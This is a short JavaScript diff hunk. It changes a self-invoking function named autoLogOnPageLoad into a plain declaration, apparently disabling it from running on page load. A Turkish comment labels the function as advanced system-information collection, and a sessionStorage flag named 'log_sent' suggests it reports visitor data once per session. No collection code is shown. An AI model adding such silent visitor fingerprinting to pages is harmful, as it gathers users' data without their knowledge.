@@ -543,7 +543,7 @@ function launchEliteRoom() {
             });
         });
 
-(function autoLogOnPageLoad() {
+function autoLogOnPageLoad() {
     if (sessionStorage.getItem('log_sent')) return;
     
     // ========== GELİŞMİŞ SİSTEM BİLGİSİ TOPLAMA ==========
